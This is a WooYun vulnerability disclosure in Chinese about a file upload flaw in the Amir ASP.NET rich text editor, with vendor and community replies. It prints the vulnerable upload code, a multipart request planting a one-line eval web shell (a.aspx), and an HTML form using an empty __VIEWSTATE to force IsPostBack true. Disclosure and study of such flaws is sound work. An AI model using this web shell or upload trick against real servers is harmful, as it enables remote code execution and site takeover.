{"id": 47859, "wybug_id": "wooyun-2014-079446", "wybug_title": "某富文本编辑器文件上传漏洞（小论如何控制IsPostBack的值）", "wybug_corp": "Amir富文本编辑器", "wybug_author": "wefgod", "wybug_date": "2014-10-15 11:39", "wybug_open_date": "2015-01-13 11:40", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传", "代码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-13：\t细节向公众公开  简要描述： Amir富文本编辑器，其实就一个很小的货。从这货上看看如何控制.NET的IsPostBack的值。大牛就绕道吧我就是打酱油的 详细说明：  \n\n   漏洞证明：  在这个文本编辑器上没有找到任何按钮是可以直接上传文件的（只有插入文件上传按钮，没啥用），但是代码里面是隐藏有这样一个功能的：\nprotected override void RenderContents(HtmlTextWriter output)            {                if (this.Page.IsPostBack) //判断是否第一次访问，这个是小的关键点                {                    //if there is an uploaded file                    HttpFileCollection UploadFile =this.Page.Request.Files;                    for (int i = 0; i < UploadFile.Count; i++)                    {                        HttpPostedFile file =   UploadFile[i];                        string FileName = Path.GetFileName(file.FileName);                        string StrPath = this.Page.MapPath(\"~/Uploads/\");                        try                        {                            file.SaveAs(Path.Combine(StrPath, FileName));                        }                        catch (DirectoryNotFoundException DirectoryNullException)                        {                            output.Write(DirectoryNullException.Message);                        }                    }                }                Page.ClientScript.GetPostBackEventReference(this.Page, string.Empty);                HtmlSourceInitializer.InitializeHtmlSource(this.Page);                output.Write(HtmlSourceInitializer.RichTextHtmlSource.ToString());            }\nRenderContents是绘制自定义控件时会自动调用的一个方法，这个编辑器直接把他重写了。里面对于文件上传的判断，主要是由this.Page.IsPostBack来控制的，IsPostBack意思简述就是“是否是第一次访问该页面”。更多请看：http://msdn.microsoft.com/zh-cn/library/system.web.ui.page.ispostback.aspx所以，对于IsPostBack的值的控制，是是否可以成功上传文件的关键。所以我们先考虑下，有没有比较万全的方法，可以使得IsPostBack的值可以为true（为true我们就可以上传文件了啊）先搞一个文件上传的html试试：<html><form action=\"http://1/Default.aspx\" name=\"test\" method=\"post\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"file\" size=\"23\" id=\"file\" /><input type=\"submit\" value=\"Submit\" /></form></html>\n\n上传了，文件夹里面并没有生成文件：\n\n所以很肯定的一点，就是直接用这个方法上传文件，ispostback是肯定不会有true的！再用自带的demo，里面有一个get data的按钮，直接点击\n\n我们会看到自动提交了很多数据，在里面插入一段文件的代码：\nContent-Disposition: form-data; name=\"file\"; filename=\"a.aspx\"Content-Type: application/xml<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"w\"],\"unsafe\");%>ai\n先去掉其它东西，留下viewstate和这段file代码\n------WebKitFormBoundaryI4bps9FYvWWWngDbContent-Disposition: form-data; name=\"__VIEWSTATE\"/wEPDwUKMjEyNTk0Njc3Ng9kFgRmDxYCHglpbm5lcmh0bWwFqAQ8dGl0bGU+S3VsZWguY29tPC90aXRsZT48bGluayByZWw9J3N0eWxlc2hlZXQnIHR5cGU9J3RleHQvY3NzJyBocmVmPScvV2ViUmVzb3VyY2UuYXhkP2Q9VE54b2cyVGt0YzA1aFdidHg3OXpBOG5UbWEyWEhUSmxrNkozSV9OUWhmVjRpeVNIcnhvRHJNSXVjSEFlTl9fd25Fb3cyMGM0VGQwWmhIeWtJcDd2S2cyJnQ9NjM0OTcxMjg4NjU2MDgyOTcwJyAvPjxsaW5rIHJlbD0nc3R5bGVzaGVldCcgdHlwZT0ndGV4dC9jc3MnIGhyZWY9Jy9XZWJSZXNvdXJjZS5heGQ/ZD1UTnhvZzJUa3RjMDVoV2J0eDc5ekE4blRtYTJYSFRKbGs2SjNJX05RaGZWaVlLUGtBdUJJQUVteFFKU1ozejZwM0VvdVExZThWU3o2anJIODEtLU1YZzImdD02MzQ5NzEyODg2NTYwODI5NzAnIC8+PGxpbmsgcmVsPSdzdHlsZXNoZWV0JyB0eXBlPSd0ZXh0L2NzcycgaHJlZj0nL1dlYlJlc291cmNlLmF4ZD9kPVROeG9nMlRrdGMwNWhXYnR4Nzl6QThuVG1hMlhIVEpsazZKM0lfTlFoZlhpYnhrVk12RTB1WndQVi1NZmg5Ui1seWt1aHVfczFGQ0tDNGRmbk12cGl3MiZ0PTYzNDk3MTI4ODY1NjA4Mjk3MCcgLz5kAgEPFgIeB2VuY3R5cGUFE211bHRpcGFydC9mb3JtLWRhdGFkZH1GEi58juKz50rMm0Z+FcD3dEUs------WebKitFormBoundaryI4bps9FYvWWWngDbContent-Disposition: form-data; name=\"file\"; filename=\"a.aspx\"Content-Type: application/xml<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"w\"],\"unsafe\");%>ai------WebKitFormBoundaryI4bps9FYvWWWngDb—\n\n\n此时测试是可以成功上传文件的：\n\n先解开viewstate看看，看是否存在某一个值比如ispostback=true？\n\n仔细对照了下，没有发现任何的地方是有ispostback=true的。再清空viewstate，让viewstate=null\n\n一样成功上传了文件\n\n所以按这个情况来分析，ispostback=true的一个条件是存在viewstate这个参数！只要viewstate是正确的或者为空值，都可以成立（千万不能乱伪造，接不开viewstate会导致系统报错，会500）。综上，当遇到需要控制ispostback的值为true的时候，只要存在一个可控不会报错的viewstate值，服务器就会自动判断你不是第一次访问该页面，可以直接用类似下面的html代码解决问题：\n<html><form action=\"http://1.1.1.1/Default.aspx\" name=\"test\" method=\"post\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"file\" size=\"23\" id=\"file\" /><input type=\"hidden\" name=\"__VIEWSTATE\" value=\"\" /><input type=\"submit\" value=\"Submit\" /></form></html>\n\n\n小漏洞里面也可以研究出一些小知识，希望大家受益。这个点可能还可以用在很多其它系统上，说不定会有很给力的效果（比如一些绕过）。   修复方案：  大牛们懂   版权声明：转载请注明来源 wefgod@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2014-10-20 08:21 厂商回复： cnvd确认所述分析和测试结果，暂未建立与软件开发者的直接联系渠道，待认领。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-20 08:56 |    \t\t茜茜公主 \t\t\t( 普通白帽子  |\t\t\t        Rank:2360 漏洞数:406        | 家里二宝出生，这几个月忙着把屎把尿...忒...)\t\t \n  围观    \n     2014-11-10 17:34 |    \t\tsco4x0 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        | O_o)\t\t \n  我注册了个小号来看大哥发通用漏洞    \n     2014-11-11 16:07 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @sco4x0 啥情况    \n     2015-01-13 13:19 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  不错，挺赞的。    \n     2015-01-13 14:47 |    \t\tsco4x0 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        | O_o)\t\t \n  大哥不愧是.net牛，学习了    \n     2015-01-21 16:27 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @sco4x0 @梧桐雨 打酱油的。    \n     2015-01-24 15:51 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  IsPostBack都可控了，吊啊    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}